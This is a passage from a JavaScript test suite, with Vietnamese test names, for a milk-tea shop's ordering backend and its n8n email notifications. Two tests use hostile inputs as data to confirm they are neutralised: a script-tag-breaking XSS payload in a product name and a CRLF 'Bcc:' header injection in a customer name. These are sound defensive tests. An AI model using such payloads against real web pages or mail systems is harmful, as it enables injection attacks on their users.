  env.setConfig('shipping_fee_den_10km', 15000);
  const result = env.post(order());
  assert.equal(result.total, 125000);
  assert.equal(result.shipping_fee, 15000);
  assert.equal(env.getJson().products[0].price, 55000);
});

test('dòng không có order_code không phải là đơn: không báo, không tính suất', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  sheet.store(2, env.columnOf('Đơn hàng', 'note'), 'ghi chú lạc');
  sheet.store(2, env.columnOf('Đơn hàng', 'cups'), 500);
  assert.deepEqual(env.pending().orders, []);
  assert.equal(env.pending().low_stock.counted_cups, 0);
  assert.equal(env.post(order()).order_code, 'TS-0001');
  assert.deepEqual(env.pending().orders.map((o) => o.order_code), ['TS-0001']);
});

test('ô chọn từ chối giá trị ngoài danh sách', () => {
  const env = readyEnv();
  assert.ok(env.dropdowns.length >= 4);
  assert.ok(env.dropdowns.every((allowInvalid) => allowInvalid === false));
});

test('giá món hoặc phí ship 1 đến 999đ coi là gõ sai', () => {
  const env = readyEnv();
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-matcha', 'price', 49);
  assert.deepEqual(env.getJson().products.map((p) => p.product_id), ['tra-sua-truyen-thong']);
  env.setConfig('shipping_fee_den_10km', 10);
  // Đã có bản hợp lệ từ lần đọc trên: dùng phí cũ và cảnh báo, không tính 10đ.
  const kept = env.post(order());
  assert.equal(kept.shipping_fee, 10000);
  assert.match(env.pending().config_alert.messages[0], /"Phí ship đến 10km" từ 1 đến 999đ.*10\.000đ/);
});

test('phí ship 1 đến 999đ khi chưa từng có Cấu hình hợp lệ: từ chối như trước', () => {
  const env = readyEnv();
  env.setConfig('shipping_fee_den_10km', 10);
  assert.equal(env.post(order()).error_code, 'SERVER_ERROR');
  assert.equal(env.orderRows().length, 0);
});

test('workflow: timeout hai node HTTP là 20 giây', () => {
  const wf = JSON.parse(read('n8n/order-notify.json'));
  const http = wf.nodes.filter((n) => n.type === 'n8n-nodes-base.httpRequest');
  assert.equal(http.length, 2);
  assert.ok(http.every((n) => n.parameters.options.timeout === 20000));
});

test('món chuyển inactive: không còn trên menu và không đặt được', () => {
  const env = readyEnv();
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-truyen-thong', 'status', 'inactive');
  assert.equal(env.getJson().products.length, 1);
  assert.equal(env.post(order()).error_code, 'INVALID_INPUT');
});

/* ---------- Khoá ---------- */

test('sai khoá ở pending và ack: từ chối, không lộ dữ liệu, không đánh dấu', () => {
  const env = readyEnv();
  env.post(order({ name: 'Khách bí mật' }));
  for (const key of ['sai', '', undefined, STAFF_KEY]) {
    const raw = env.get({ action: 'pending', key }).content;
    assert.equal(JSON.parse(raw).ok, false);
    assert.equal(JSON.parse(raw).error_code, 'UNAUTHORIZED');
    assert.ok(!raw.includes('Khách bí mật'));
    assert.equal(env.post({ codes: ['TS-0001'] }, { action: 'ack', key }).error_code, 'UNAUTHORIZED');
  }
  assert.equal(env.orderRows()[0].notified_at, '');
});

test('chưa đặt khoá trong Script Properties: từ chối cả khoá rỗng', () => {
  const env = makeEnv();
  env.setup();
  assert.equal(env.getJson({ action: 'pending', key: '' }).error_code, 'UNAUTHORIZED');
  assert.equal(env.ack({ codes: [] }, '').error_code, 'UNAUTHORIZED');
  assert.equal(env.staff(order(), '').error_code, 'UNAUTHORIZED');
  assert.ok(env.get({ page: 'staff', key: '' }).content.includes('Link này không còn dùng được'));
});

test('form nội bộ sai khoá: trang từ chối, gửi đơn bị từ chối, không có dữ liệu', () => {
  const env = readyEnv();
  env.post(order({ name: 'Khách bí mật' }));
  const page = env.get({ page: 'staff', key: 'sai' }).content;
  assert.ok(page.includes('Link này không còn dùng được'));
  assert.ok(!page.includes('tra-sua-truyen-thong'));
  assert.ok(!page.includes(STAFF_KEY));
  assert.equal(env.staff(order(), 'sai').error_code, 'UNAUTHORIZED');
  assert.equal(env.orderRows().length, 1);
});

test('trang landing không gọi được ack hay pending khi không có action và khoá', () => {
  const env = readyEnv();
  assert.equal(env.post({}, { action: 'la' }).error_code, 'INVALID_INPUT');
  assert.equal(env.getJson({ action: 'la' }).error_code, 'INVALID_INPUT');
});

/* ---------- Form nội bộ ---------- */

test('trang nội bộ đúng khoá: có menu, script chạy được, tên lạ không thoát khỏi thẻ script', () => {
  const env = readyEnv();
  env.setCell('Món', (h) => (row) => row[h.indexOf('product_id')] === 'tra-sua-matcha', 'name', '</script><img src=x onerror=alert(1)>');
  const output = env.get({ page: 'staff', key: STAFF_KEY });
  const html = output.content;
  assert.equal(output.metaTags.viewport, 'width=device-width, initial-scale=1');
  assert.ok(!html.includes('<img src=x'));
  assert.ok(!html.includes('<?'), 'không còn scriptlet chưa thay');
  const scripts = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)];
  assert.equal(scripts.length, 1);
  new vm.Script(scripts[0][1]);
  assert.ok(!/innerHTML/.test(html), 'chỉ hiển thị bằng textContent');
  assert.ok(scripts[0][1].includes('tra-sua-truyen-thong'));
});

test('form nội bộ: nguồn messenger, chuyển khoản thành cho_chuyen_khoan, lưu link liên hệ', () => {
  const env = readyEnv();
  const contact = 'https://facebook.com/khach.a';
  const result = env.staff(order({ source: undefined, payment_method: 'chuyen_khoan', contact }));
  assert.equal(result.ok, true);
  assert.equal(result.cups, 2);
  assert.equal(result.needs_call, false);
  const row = env.orderRows()[0];
  assert.equal(row.source, 'messenger');
  assert.equal(row.payment_status, 'cho_chuyen_khoan');
  assert.equal(row.contact, contact);
});

test('form nội bộ đánh dấu cần gọi; landing không gửi được cờ này', () => {
  const env = readyEnv();
  assert.equal(env.staff(order({ needs_call: true })).needs_call, true);
  assert.equal(env.orderRows()[0].needs_call, true);
  env.post(order({ needs_call: true }));
  assert.equal(env.orderRows()[1].needs_call, false);
});

test('đơn trùng giữa hai lần bấm ở form nội bộ chỉ tạo một dòng', () => {
  const env = readyEnv();
  const payload = order();
  assert.equal(env.staff(payload).order_code, env.staff(payload).order_code);
  assert.equal(env.orderRows().length, 1);
});

/* ---------- pending, ack ---------- */

test('pending chỉ trả đơn chưa báo, ack đánh dấu đúng đơn đã gửi', () => {
  const env = readyEnv();
  env.post(order());
  env.post(order());
  const pending = env.pending();
  assert.deepEqual(pending.orders.map((o) => o.order_code), ['TS-0001', 'TS-0002']);
  assert.equal(pending.has_more, false);
  assert.match(pending.orders[0].created_at, /^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/);

  // pending không tự đánh dấu.
  assert.equal(env.pending().orders.length, 2);

  assert.deepEqual(env.ack({ codes: ['TS-0001'] }), { ok: true, acked: 1 });
  assert.deepEqual(env.pending().orders.map((o) => o.order_code), ['TS-0002']);

  const stamp = env.orderRows()[0].notified_at;
  assert.ok(stamp);
  assert.deepEqual(env.ack({ codes: ['TS-0001', 'KHONG-CO'] }), { ok: true, acked: 0 });
  assert.equal(env.orderRows()[0].notified_at, stamp, 'ack lại không đổi thời điểm cũ');
});

test('ack sai dữ liệu: INVALID_INPUT, không đổi gì', () => {
  const env = readyEnv();
  env.post(order());
  for (const body of ['{hỏng', '[]', { codes: 'TS-0001' }, { codes: [1] }]) {
    assert.equal(env.ack(body).error_code, 'INVALID_INPUT');
  }
  assert.equal(env.orderRows()[0].notified_at, '');
});

test('pending chia lô: đơn cũ trước, has_more báo còn', () => {
  const env = readyEnv();
  env.setConfig('max_cups_per_phone_public', 1000);
  for (let i = 0; i < 52; i++) env.post(order(cups(1)));
  const first = env.pending();
  assert.equal(first.orders.length, 50);
  assert.equal(first.orders[0].order_code, 'TS-0001');
  assert.equal(first.has_more, true);
  env.ack({ codes: first.orders.map((o) => o.order_code) });
  const second = env.pending();
  assert.deepEqual(second.orders.map((o) => o.order_code), ['TS-0051', 'TS-0052']);
  assert.equal(second.has_more, false);
});

/* ---------- Chạy luồng n8n: code trong workflow gọi Code.gs giả ---------- */

const workflow = JSON.parse(read('n8n/order-notify.json'));
const nodeByName = Object.fromEntries(workflow.nodes.map((n) => [n.name, n]));

function runCode(nodeName, input, refs = {}) {
  const fn = new Function('$input', '$', nodeByName[nodeName].parameters.jsCode);
  const $input = { first: () => ({ json: input }) };
  const $ = (name) => ({ first: () => ({ json: refs[name] }) });
  return fn($input, $);
}

const CFG = { web_app_url: 'https://script.example/exec', notify_to: 'nhom@example.com', from_email: 'gui@example.com' };

/** Một lần chạy workflow. send ném lỗi là SMTP hỏng: không được ack. */
function runWorkflow(env, send) {
  const pending = env.pending();
  const items = runCode('Soạn email', pending, { 'Cấu hình': CFG });
  if (items.length === 0) return [];
  const sent = items.map((item) => item.json);
  sent.forEach(send);
  const ackResult = env.ack(sent[0].ack);
  runCode('Kiểm tra ack', ackResult);
  return sent;
}

test('workflow: inactive, đúng thứ tự, đủ node, không có secret, ở ngoài thư mục import', () => {
  assert.equal(workflow.active, false);
  const order = [];
  for (let name = 'Mỗi phút'; name;) {
    order.push(name);
    name = workflow.connections[name]?.main[0][0].node;
  }
  assert.deepEqual(order, ['Mỗi phút', 'Cấu hình', 'Lấy đơn chờ báo', 'Soạn email', 'Gửi email', 'Đánh dấu đã báo', 'Kiểm tra ack']);
  assert.equal(nodeByName['Mỗi phút'].parameters.rule.interval[0].minutesInterval, 1);
  assert.equal(nodeByName['Gửi email'].type, 'n8n-nodes-base.emailSend');
  assert.equal(nodeByName['Gửi email'].parameters.emailFormat, 'text');
  assert.equal(nodeByName['Đánh dấu đã báo'].executeOnce, true);
  const raw = JSON.stringify(workflow);
  assert.ok(!raw.includes('key='), 'khoá không nằm trong workflow');
  assert.ok(nodeByName['Lấy đơn chờ báo'].credentials.httpQueryAuth);
  assert.ok(nodeByName['Đánh dấu đã báo'].credentials.httpQueryAuth);
  assert.ok(nodeByName['Gửi email'].credentials.smtp);
  assert.ok(!fs.existsSync(path.join(root, '../n8n-mvp/workflows/order-notify.json')));
});

test('không có đơn: không gửi email, không ack', () => {
  const env = readyEnv();
  const sent = [];
  assert.deepEqual(runWorkflow(env, (m) => sent.push(m)), []);
  assert.equal(sent.length, 0);
});

test('phản hồi lỗi từ Apps Script làm execution đỏ thay vì im lặng', () => {
  assert.throws(() => runCode('Soạn email', { ok: false, error_code: 'UNAUTHORIZED' }, { 'Cấu hình': CFG }), /UNAUTHORIZED/);
  assert.throws(() => runCode('Kiểm tra ack', { ok: false, error_code: 'SERVER_ERROR' }), /SERVER_ERROR/);
});

test('n8n tắt rồi bật lại: báo đủ, mỗi đơn đúng một lần', () => {
  const env = readyEnv();
  env.post(order());
  env.staff(order());
  env.post(order());

  const emails = [];
  runWorkflow(env, (m) => emails.push(m));
  assert.equal(emails.length, 1);
  assert.match(emails[0].text, /TS-0001/);
  assert.match(emails[0].text, /TS-0002/);
  assert.match(emails[0].text, /TS-0003/);
  assert.equal(emails[0].to, CFG.notify_to);

  runWorkflow(env, (m) => emails.push(m));
  assert.equal(emails.length, 1, 'chạy lại không báo lại');

  env.post(order());
  runWorkflow(env, (m) => emails.push(m));
  assert.equal(emails.length, 2);
  assert.match(emails[1].text, /TS-0004/);
  assert.doesNotMatch(emails[1].text, /TS-0003/);
});

test('gửi email lỗi: chưa ack, lần sau báo lại, không mất đơn', () => {
  const env = readyEnv();
  env.post(order());
  assert.throws(() => runWorkflow(env, () => { throw new Error('SMTP hỏng'); }));
  assert.equal(env.orderRows()[0].notified_at, '');
  const emails = [];
  runWorkflow(env, (m) => emails.push(m));
  assert.equal(emails.length, 1);
  assert.match(emails[0].text, /TS-0001/);
});

test('đơn needs_call: email ghi rõ cần gọi, đơn khác thì không', () => {
  const env = readyEnv();
  env.post(order(cups(5)));
  env.post(order(cups(1)));
  const [email] = runWorkflow(env, () => {});
  assert.equal(email.subject, '🔔 2 đơn mới · 6 phần · 1 cần gọi');
  const [first, callBlock, normalBlock] = email.text.split('\n\n');
  assert.equal(first, 'Có 2 đơn mới, 1 đơn cần gọi trước khi làm.');
  assert.match(callBlock, /^TS-0001 · 5 phần · 255\.000đ · CẦN GỌI: đơn lớn, trả tiền mặt\n/);
  assert.match(normalBlock, /^TS-0002 · 1 phần · /);
  assert.doesNotMatch(normalBlock, /CẦN GỌI/);
  assert.doesNotMatch(email.text, /Việc tiếp theo/);
});

test('email đơn mới không có đơn cần gọi: không có dòng đầu, mở thẳng vào đơn', () => {
  const env = readyEnv();
  env.post(order(cups(1)));
  const [email] = runWorkflow(env, () => {});
  assert.equal(email.subject, '🔔 1 đơn mới · 1 phần');
  assert.match(email.text, /^TS-0001 · 1 phần · 59\.000đ\n/);
});

test('lý do cần gọi: đơn lớn, SĐT từng bom kèm mã đơn, nhân viên đánh dấu; email, trang và Sheet ghi đúng', () => {
  const env = readyEnv();
  const phone = '0912345678';
  const bombed = env.post(order({ phone, ...cups(1) }));
  env.setOrderStatus(bombed.order_code, 'bom');
  runWorkflow(env, () => {});

  const big = env.staff(order({ ...cups(5) }));
  assert.equal(big.call_reason, 'đơn lớn, trả tiền mặt');
  const bom = env.staff(order({ phone, ...cups(1) }));
  assert.equal(bom.call_reason, `SĐT từng bom ${bombed.order_code}`);
  const manual = env.staff(order({ needs_call: true, payment_method: 'chuyen_khoan', ...cups(1) }));
  assert.equal(manual.call_reason, 'nhân viên đánh dấu');
  const none = env.staff(order(cups(1)));
  assert.equal(none.needs_call, false);
  assert.equal(none.call_reason, '');
  assert.equal(env.staff(order({ phone, ...cups(1), submission_id: 'lai-bom' })).call_reason, `SĐT từng bom ${bombed.order_code}`);

  const row = env.orderRows().find((r) => r.order_code === bom.order_code);
  assert.equal(row.call_reason, `SĐT từng bom ${bombed.order_code}`);
  const landing = env.post(order({ ...cups(5) }));
  assert.equal(landing.call_reason, undefined, 'landing không thấy lý do');

  const [email] = runWorkflow(env, () => {});
  assert.match(email.text, new RegExp(`${big.order_code} · 5 phần · [\\d.]+đ · CẦN GỌI: đơn lớn, trả tiền mặt`));
  assert.match(email.text, new RegExp(`${bom.order_code} · 1 phần · [\\d.]+đ · CẦN GỌI: SĐT từng bom ${bombed.order_code}`));
  assert.match(email.text, new RegExp(`${manual.order_code} · 1 phần · [\\d.]+đ · CẦN GỌI: nhân viên đánh dấu · Chờ chuyển khoản`));
  assert.match(email.text, new RegExp(`${landing.order_code} · 5 phần · [\\d.]+đ · CẦN GỌI: đơn lớn, trả tiền mặt`));
  assert.ok(lists(env).held.some((h) => h.reason === `chờ gọi: SĐT từng bom ${bombed.order_code}`));
});

test('email là văn bản thuần và tiêu đề không chứa dữ liệu khách', () => {
  const env = readyEnv();
  env.post(order({ name: 'Khách\r\nBcc: x@example.com <b>đậm</b>', note: 'Ít đá' }));
  const [email] = runWorkflow(env, () => {});
  assert.doesNotMatch(email.subject, /Khách|\n/);
  assert.match(email.text, /Khách Bcc: x@example.com <b>đậm<\/b>/);
  assert.match(email.text, /Ghi chú: Ít đá/);
  assert.match(email.text, /108\.000đ/);
});

test('cảnh báo sắp hết suất: một email, không lặp mỗi phút', () => {
  const env = readyEnv();
  env.setConfig('low_stock_alert_cups', 5);
  env.setConfig('call_threshold_cups', 100);
  env.setConfig('max_cups', 10);
  env.setConfig('max_cups_per_phone_public', 100);

  env.post(order(cups(4)));
  let emails = runWorkflow(env, () => {});
  assert.equal(emails.length, 1);
  assert.doesNotMatch(emails[0].subject, /phần cuối/);

  env.post(order(cups(2)));
  emails = runWorkflow(env, () => {});
  assert.equal(emails.length, 2);
  assert.equal(emails[0].subject, '⚠️ Còn 4 phần cuối');
  assert.equal(emails[0].text, 'Đã nhận 6/10 phần.');
  assert.match(emails[1].subject, /đơn mới/);

  // Chạy lại nhiều phút, không có đơn mới: không email nào.
  assert.deepEqual(runWorkflow(env, () => {}), []);
  assert.deepEqual(runWorkflow(env, () => {}), []);

  // Có đơn mới: báo đơn, không báo lại cảnh báo.
  env.post(order(cups(1)));
  emails = runWorkflow(env, () => {});
  assert.equal(emails.length, 1);
  assert.doesNotMatch(emails[0].subject, /phần cuối/);
});

test('cảnh báo gửi lỗi thì lần sau gửi lại', () => {
  const env = readyEnv();
  env.setConfig('low_stock_alert_cups', 1);
  env.post(order());
  assert.throws(() => runWorkflow(env, () => { throw new Error('SMTP hỏng'); }));
  const emails = runWorkflow(env, () => {});
  assert.match(emails[0].subject, /phần cuối/);
});

test('huỷ đơn tụt dưới ngưỡng rồi vượt lại: được cảnh báo lần nữa', () => {
  const env = readyEnv();
  env.setConfig('low_stock_alert_cups', 5);
  env.setConfig('call_threshold_cups', 100);
  const first = env.post(order(cups(5)));
  assert.match(runWorkflow(env, () => {})[0].subject, /phần cuối/);
  env.setOrderStatus(first.order_code, 'huy');
  assert.deepEqual(runWorkflow(env, () => {}), []);
  env.post(order(cups(5)));
  assert.match(runWorkflow(env, () => {})[0].subject, /phần cuối/);
});

/* ---------- Trang mẫu ---------- */

test('landing mẫu: gửi text/plain, có ô bẫy bot, không gửi giá, không dùng innerHTML', () => {
  const html = read('landing-example.html');
  assert.match(html, /text\/plain/);
  assert.match(html, /id="website"/);
  assert.ok(!/innerHTML/.test(html));
  assert.ok(!/\btotal:/.test(html));
  const script = html.match(/<script>([\s\S]*?)<\/script>/)[1];
  new vm.Script(script);
});

/* ---------- Tiêu đề tiếng Việt và kiểu các tab ---------- */

const headerRow = (env, name) => {
  const sheet = env.sheets.get(name);
  return plain(sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0]);
};

const EXPECTED_HEADERS = {
  'Đơn hàng': ['Mã', 'Giờ đặt', 'Trạng thái', 'Thanh toán', 'Cần gọi', 'Đã gọi', 'Lý do gọi', 'Tên', 'SĐT', 'Liên hệ', 'Món', 'Số lượng',
    'Nhận', 'Khu vực', 'Địa chỉ', 'Trả bằng', 'Ship', 'Tổng', 'Ghi chú', 'Lý do huỷ', 'Kênh', 'Đã báo', 'Mã gửi', 'Chi tiết', 'QR'],
  'Cấu hình': ['Ý nghĩa', 'Giá trị', 'Khoá'],
  'Món': ['Mã', 'Tên', 'Giá', 'Trạng thái'],
  'Topping': ['Mã', 'Tên', 'Giá', 'Trạng thái'],
  'Đơn lỗi': ['Mã', 'Giờ', 'Lỗi', 'Lý do', 'Nội dung', 'Đã báo'],
};

test('setup mới: dòng 1 của mọi tab là nhãn tiếng Việt dạng NFC; khoá Cấu hình ở cột 1 và giá trị ô chọn không đổi', () => {
  const env = readyEnv();
  for (const [name, labels] of Object.entries(EXPECTED_HEADERS)) {
    assert.deepEqual(headerRow(env, name), labels, name);
    labels.forEach((label) => assert.equal(label.normalize('NFC'), label));
  }
  assert.equal(env.configRows()[0].key, 'orders_open');
  const created = env.post(order());
  assert.equal(env.orderRows()[0].status, 'moi');
  assert.deepEqual(env.pending().orders.map((o) => o.order_code), [created.order_code]);
});

test('nhãn gõ lại ở dạng NFD vẫn đọc đúng, không tạo cột mới', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  sheet.store(1, env.columnOf('Đơn hàng', 'status'), 'Trạng thái'.normalize('NFD'));
  const columns = sheet.getLastColumn();
  assert.equal(env.post(order()).ok, true);
  env.setup();
  assert.equal(sheet.getLastColumn(), columns);
});

test('Sheet tiêu đề tiếng Anh có đơn: trước setup vẫn chạy; setup đổi tại chỗ, không mất dữ liệu, đơn và danh sách vẫn đúng', () => {
  const env = withBank(readyEnv());
  env.setConfig('max_cups', 123);
  const cod = env.post(order({ name: 'Khách cũ', note: 'ít đường' }));
  const transfer = order({ payment_method: 'chuyen_khoan' });
  const firstTransfer = env.post(transfer);
  env.gs.setupBackupForm();
  env.submitForm(backupAnswers({ [FIELDS.phone]: '123' }), 'loi-cu');
  env.useEnglishHeaders();
  assert.equal(headerRow(env, 'Đơn hàng')[0], 'order_code');

  // Bản code mới phải đọc được tiêu đề cũ, vì được deploy trước khi chạy setup.
  assert.equal(env.post(order()).ok, true);
  assert.equal(lists(env).ok, true);
  assert.equal(env.pending().backup_errors.length, 1);

  const snapshot = new Map([...env.sheets].map(([name, sheet]) => [name, plain(sheet.cells.slice(1))]));
  env.setup();

  for (const [name, labels] of Object.entries(EXPECTED_HEADERS)) {
    assert.deepEqual(headerRow(env, name), labels, name);
  }
  assert.deepEqual(plain(env.sheets.get('Đơn hàng').cells.slice(1)), snapshot.get('Đơn hàng'), 'cột không dịch chuyển');
  assert.deepEqual(plain(env.sheets.get('Món').cells.slice(1)), snapshot.get('Món'));
  assert.deepEqual(plain(env.sheets.get('Đơn lỗi').cells.slice(1)), snapshot.get('Đơn lỗi'));

  assert.deepEqual(env.post(transfer), firstTransfer);
  assert.equal(env.getJson().products[0].price, 49000);
  const after = env.post(order({ ...cups(1), note: 'mới' }));
  const row = env.orderRows().at(-1);
  assert.equal(row.order_code, after.order_code);
  assert.equal(row.note, 'mới');
  assert.equal(env.orderRows()[0].name, 'Khách cũ');
  assert.equal(lists(env).prep.lines[0].notes[0].order_code, cod.order_code);
  assert.equal(report(env).cumulative.cups, 7);
  const pending = env.pending();
  assert.equal(pending.orders.length, 4);
  assert.deepEqual(env.ack({ codes: [cod.order_code], backup_errors: ['loi-cu'] }), { ok: true, acked: 1, backup_acked: 1 });
  assert.ok(env.orderRows()[0].notified_at);
  assert.ok(backupRows(env)[0].notified_at);
});

test('chạy lại setup: không nhân đôi cột, màu xen kẽ; bỏ ghi chú chỉ lặp tên cột, giữ ghi chú giải thích', () => {
  const env = readyEnv();
  const orders = env.sheets.get('Đơn hàng');
  orders.getRange(1, env.columnOf('Đơn hàng', 'source')).setNote('Kênh đặt');
  env.useEnglishHeaders();
  env.setup();
  env.setup();
  for (const [name, labels] of Object.entries(EXPECTED_HEADERS)) {
    assert.deepEqual(headerRow(env, name), labels, name);
    assert.equal(env.sheets.get(name).bandings.length, 1, name);
  }
  assert.match(orders.notes[env.columnOf('Đơn hàng', 'status')], /moi, dang_lam/);
  assert.match(orders.notes[env.columnOf('Đơn hàng', 'payment_status')], /cho_chuyen_khoan/);
  assert.equal(orders.notes[env.columnOf('Đơn hàng', 'source')], undefined);
  assert.equal(orders.notes[env.columnOf('Đơn hàng', 'order_code')], undefined);
});

test('cột của nhóm giữ nguyên, kể cả khi đặt tên trùng khoá hoặc trùng nhãn', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  const base = sheet.getLastColumn();
  // Nhóm thêm cột như trong Sheets thật: lưới được nới ra trước.
  sheet.insertColumnsAfter(sheet.getMaxColumns(), 2);
  sheet.store(1, base + 1, 'Người phụ trách');
  sheet.store(1, base + 2, 'phone');
  const created = env.post(order({ phone: '0912345678' }));
  sheet.store(2, base + 1, 'Lan');
  sheet.store(2, base + 2, 'không phải SĐT');
  env.setup();
  assert.equal(sheet.value(1, base + 1), 'Người phụ trách');
  assert.equal(sheet.value(1, base + 2), 'phone');
  assert.equal(sheet.value(2, base + 1), 'Lan');
  assert.equal(env.pending().orders[0].phone, '0912345678');
  env.post(order({ phone: '0987654321' }));
  assert.equal(sheet.value(3, base + 2), '', 'code không ghi vào cột của nhóm');
  assert.equal(env.orderRows()[0].order_code, created.order_code);
});

test('Sheet cũ có cột nhóm trùng nhãn sắp đổi: giữ tiêu đề cũ của cột hệ thống, không tạo hai cột trùng tên', () => {
  const env = readyEnv();
  env.useEnglishHeaders();
  const sheet = env.sheets.get('Đơn hàng');
  const team = sheet.getLastColumn() + 1;
  const noteColumn = env.columnOf('Đơn hàng', 'note');
  sheet.store(1, team, 'Ghi chú');
  env.post(order({ note: 'của khách' }));
  sheet.store(2, team, 'của nhóm');
  env.setup();
  assert.equal(sheet.value(1, noteColumn), 'note');
  assert.equal(sheet.value(1, team), 'Ghi chú');
  assert.equal(sheet.value(2, team), 'của nhóm');
  assert.equal(env.orderRows()[0].note, 'của khách');
  env.setup();
  assert.equal(headerRow(env, 'Đơn hàng').filter((h) => h === 'Ghi chú').length, 1);
});

test('kiểu các tab: cỡ chữ, độ rộng, ngắt dòng, định dạng tiền; không ẩn cột; cột giá trị Cấu hình không bị định dạng', () => {
  const env = readyEnv();
  for (const name of ['Cấu hình', 'Món', 'Topping', 'Đơn lỗi']) {
    const sheet = env.sheets.get(name);
    assert.equal(sheet.dataFontSize, 11, name);
    assert.deepEqual([...(sheet.hiddenColumns || [])], name === 'Cấu hình' ? [env.columnOf('Cấu hình', 'key')] : [], name);
    assert.ok(Object.keys(sheet.columnWidths).length >= 3, name);
  }
  const config = env.sheets.get('Cấu hình');
  assert.deepEqual([...config.wrappedColumns], [env.columnOf('Cấu hình', 'ghi_chu')]);
  const formats = Object.entries(config.numberFormats);
  assert.equal(formats.length, 3, 'chỉ ba ô tài khoản ngân hàng');
  assert.ok(formats.every(([, format]) => format === '@'));

  const backup = env.sheets.get('Đơn lỗi');
  assert.deepEqual([...backup.wrappedColumns].sort(), [env.columnOf('Đơn lỗi', 'message'), env.columnOf('Đơn lỗi', 'answers')].sort());

  for (const name of ['Món', 'Topping']) {
    const sheet = env.sheets.get(name);
    assert.equal(sheet.numberFormats[`2,${env.columnOf(name, 'price')}`], '#,##0', name);
  }
  assert.equal(env.getJson().products[0].price, 49000);
});

test('tab tên cũ: trước setup vẫn chạy; setup đổi tên tại chỗ, giữ dữ liệu, chạy lại không đổi gì thêm', () => {
  const env = readyEnv();
  const created = env.post(order({ name: 'Khách cũ' }));
  env.setConfig('max_cups', 123);
  env.gs.setupBackupForm();
  env.submitForm(backupAnswers({ [FIELDS.phone]: '123' }), 'loi-cu');
  const orderSheet = env.sheets.get('Đơn hàng');
  env.useEnglishHeaders();
  env.useOldTabNames();
  assert.deepEqual([...env.sheets.keys()].sort(), ['Backup_Loi', 'Config', 'Orders', 'Products', 'Toppings']);

  assert.equal(env.post(order()).ok, true);
  assert.equal(lists(env).ok, true);
  assert.equal(env.pending().backup_errors.length, 1);
  assert.equal(env.getJson().products.length, 2);
  env.submitForm(backupAnswers({ [FIELDS.phone]: '456' }), 'loi-moi');

  env.setup();

  assert.deepEqual([...env.sheets.keys()].sort(), Object.keys(EXPECTED_HEADERS).sort());
  assert.equal(env.sheets.get('Đơn hàng'), orderSheet, 'đổi tên tại chỗ, không tạo tab mới');
  assert.equal(env.orderRows()[0].order_code, created.order_code);
  assert.equal(env.orderRows()[0].name, 'Khách cũ');
  assert.equal(env.configRows().find((r) => r.key === 'max_cups').value, 123);
  assert.equal(backupRows(env).length, 2);
  assert.equal(env.renamedTabs, 5);

  env.setup();
  assert.equal(env.renamedTabs, 5, 'chạy lại không đổi tên nữa');
  assert.equal(env.sheets.size, 5);
});

test('có cả tab tên mới và tên cũ: dùng tab mới, không xoá hay sửa tab cũ', () => {
  const env = readyEnv();
  const old = env.gs.SpreadsheetApp.getActiveSpreadsheet().insertSheet('Orders');
  old.store(1, 1, 'order_code');
  old.store(2, 1, 'TS-9999');

  const created = env.post(order());
  assert.equal(created.order_code, 'TS-0001');
  env.setup();

  assert.equal(env.sheets.get('Orders'), old);
  assert.deepEqual(plain(old.cells), [['order_code'], ['TS-9999']]);
  assert.deepEqual(env.orderRows().map((r) => r.order_code), ['TS-0001']);
  assert.equal(env.post(order()).order_code, 'TS-0002');
  assert.equal(env.renamedTabs || 0, 0);
});

test('nhãn dài của bản trước được đổi tại chỗ, không thêm cột', () => {
  const env = readyEnv();
  const sheet = env.sheets.get('Đơn hàng');
  const columns = sheet.getLastColumn();
  env.post(order());
  sheet.store(1, env.columnOf('Đơn hàng', 'total'), 'Tổng tiền');
  sheet.store(1, env.columnOf('Đơn hàng', 'order_code'), 'Mã đơn');
  env.sheets.get('Cấu hình').store(1, env.columnOf('Cấu hình', 'ghi_chu'), 'Ghi chú');
  assert.equal(env.orderRows()[0].total, 108000);
  env.setup();
  assert.equal(sheet.getLastColumn(), columns);
  assert.deepEqual(headerRow(env, 'Đơn hàng'), EXPECTED_HEADERS['Đơn hàng']);
  assert.deepEqual(headerRow(env, 'Cấu hình'), EXPECTED_HEADERS['Cấu hình']);
});

test('tab Cấu hình thứ tự cũ: setup chuyển cột, giữ giá trị đã sửa, khoá mới đúng cột, chạy lại không chuyển nữa', () => {
  const env = dot1Env();
  const old = env.sheets.get('Config');
  assert.deepEqual(plain(old.getRange(1, 1, 1, 3).getValues()[0]), ['key', 'value', 'ghi_chu']);
  env.setConfig('max_cups', 123);
  env.setCell('Config', (h) => (row) => row[h.indexOf('key')] === 'max_cups', 'ghi_chu', 'Nhóm tự sửa');
  old.store(1, 4, 'cot_cua_nhom');
  old.store(2, 4, 'giữ nguyên');

  env.setup();
  const sheet = env.sheets.get('Cấu hình');
  assert.equal(sheet, old);
  assert.deepEqual(headerRow(env, 'Cấu hình'), [...EXPECTED_HEADERS['Cấu hình'], 'cot_cua_nhom']);
  assert.equal(sheet.value(2, 4), 'giữ nguyên');

  const rows = env.configRows();
  const edited = rows.find((r) => r.key === 'max_cups');
  assert.equal(edited.value, 123);
  assert.equal(edited.ghi_chu, 'Nhóm tự sửa');
  const added = rows.find((r) => r.key === 'maps_max_stops');
  assert.equal(added.value, 4);
  assert.match(added.ghi_chu, /link bản đồ/);
  const addedRow = rows.indexOf(added) + 2;
  assert.equal(sheet.value(addedRow, 1), added.ghi_chu);
  assert.equal(sheet.value(addedRow, 2), 4);
  assert.equal(sheet.value(addedRow, 3), 'maps_max_stops');

  env.setConfig('bank_code', 'vcb');
  env.setConfig('bank_account', "'0123456789");
  env.setConfig('bank_account_name', 'NGUYEN VAN A');
  assert.equal(env.getJson().transfer_enabled, true);
  const bankRow = env.configRows().findIndex((r) => r.key === 'bank_account') + 2;
  assert.equal(sheet.numberFormats[`${bankRow},2`], '@', 'ô giá trị dạng chữ đúng cột mới');

  assert.deepEqual([...sheet.hiddenColumns], [3]);
  assert.equal(sheet.protections.length, 1);
  assert.equal(sheet.protections[0].warningOnly, true);
  assert.equal(sheet.protections[0].column, 3);

  const moved = env.movedColumns;
